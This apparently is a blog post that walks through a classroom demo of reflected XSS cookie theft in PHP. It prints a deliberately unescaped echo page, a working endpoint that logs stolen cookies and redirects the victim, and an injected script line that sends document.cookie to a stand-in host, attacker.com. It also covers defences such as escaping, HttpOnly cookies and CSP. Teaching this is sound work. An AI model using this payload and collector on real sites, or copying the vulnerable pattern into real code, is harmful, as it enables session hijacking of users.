---
title: "An XSS cookie stealer, built as a teaching tool"
date: 2012-11-06
slug: xss-cookie-stealer-teaching-tool
excerpt: "Three small PHP files I keep on intrepidkarthi.com/files/xss as a working demonstration of how a cookie-stealing XSS attack actually unfolds — vulnerable page, exfiltration endpoint, log file. For workshop use only. The point is to make the attack physically visible to people who have only seen it in slides."
tags: [security, xss, web-security, teaching, php, owasp]
---

I keep a small folder of teaching artifacts at:

```
http://intrepidkarthi.com/files/xss/
```

Three PHP files and a log. Together they implement, end to end, the simplest cookie-stealing XSS attack you can write — the kind every web-security workshop tries to explain in slides and almost always fails to make tangible.

This post is the walkthrough. The code is for **classroom use**. Don't deploy it on a production system. Don't run it against any system you don't own. If you do not understand why both of those things are true, this post is also for you and you should stop here and read the OWASP XSS primer first.

## what the three files do

```
index.php      ▸ a deliberately-vulnerable page
                 echoes user input straight back, no escaping
co.php         ▸ exfiltration endpoint #1
                 receives a cookie via GET, writes it, redirects
cook.php       ▸ exfiltration endpoint #2 (timestamped variant)
cookie.txt     ▸ the stolen-cookie log file
```

The vulnerable page (`index.php`) in full:

```php
<?php
echo "karthi" . trim($_REQUEST['hey']);
?>
```

That's the whole vulnerability. There is no escaping, no encoding, no Content-Security-Policy header, no `htmlspecialchars()`. Whatever the user puts in `?hey=…` lands in the response body unmodified. If the user puts an `<script>` tag in there, the script runs.

The exfiltration endpoint (`cook.php`) — the part the script tag would call:

```php
<?php
$str = trim($_REQUEST['cookie']);
$file = 'cookie.txt';
if (!empty($str)) {
    $current = file_get_contents($file);
    $current .= date('Y-m-d H:i:s') . "\t\t" . $str . "\n\n\n";
    file_put_contents($file, $current);
    header('Location: http://bata.in/');
}
?>
```

Receive the cookie via GET, append it to a flat log file with a timestamp, and 302 the victim to an innocuous-looking destination (`bata.in` — a shoe store) so the redirect does not raise eyebrows. Total: 12 lines.

## the attack, step by step

1. The attacker finds a page that reflects user input without escaping. In our demo, that's `intrepidkarthi.com/files/xss/index.php?hey=anything`.
2. The attacker crafts a URL that injects a `<script>` tag instead of plain text. Something like:

   ```
   index.php?hey=<script>new Image().src=
     'http://attacker.com/cook.php?cookie='+document.cookie</script>
   ```

3. The attacker tricks a logged-in victim into clicking the URL. Phishing, a doctored email, a hostile comment on a forum that shows the link — many ways.
4. The victim's browser loads the page, executes the script tag (because the server emitted it as raw HTML), and the script reads `document.cookie` from whatever site the victim is currently authenticated to.
5. The cookie is shipped to `attacker.com/cook.php` via the image-pixel trick, where it lands in `cookie.txt`.
6. The victim is redirected to `bata.in` and never sees what happened.

Now the attacker has the victim's session cookie. They paste it into their own browser and they are logged in as the victim until the cookie expires.

## why this is a *teaching* artifact

Three things become physical when you set this up and walk a class through it:

**The vulnerability is small.** People who have only seen XSS in slides imagine it as something complex and exotic. The actual vulnerability is one PHP line that forgets to call `htmlspecialchars()`. The classroom moment of *"oh — that's it?"* is the entire point.

**The attacker side is also small.** The exfiltration endpoint is twelve lines. The script the attacker injects is one line. The full attack chain fits on one slide. That is what makes XSS the most prevalent web vulnerability decade after decade — the cost of writing the attack is so low that the attack will keep being written.

**The defense is also small.** Escape user input on output. Set `HttpOnly` on session cookies (so JavaScript cannot read them — this single header would have killed the demo above). Add a strict Content-Security-Policy header. Each of those is a few lines. The ecosystem has been screaming about all three for fifteen years and we still find the lapses every time we audit.

## what the artifact does *not* do

For deliberate didactic reasons, it omits everything sophisticated:

- No obfuscation. The attack tag is plain JavaScript. A real attacker would use a thousand-character base64-encoded blob.
- No persistence. Cookie-only. A real attacker would also try `localStorage` and any in-memory tokens.
- No `Referer` masking, no chained redirects, no payload that looks like a CDN URL. All of those are easy enough to add — and that is the point of leaving them out. The bare attack is the part students need to see clearly.

If you adapt this for your own workshop, please leave the simplification in. The first thing students need is the *shape* of the attack. Sophistication can come after.

## the log file

`cookie.txt` is checked in mostly empty — I wipe it after each session. It exists so the demo is fully self-contained: students click, the cookie shows up in the file, the loop closes. Visual confirmation matters.

If you find this URL in the wild and feel an urge to dump random strings into it, save us both the time. The directory has no production traffic and no one will be impressed.

— Karthikeyan
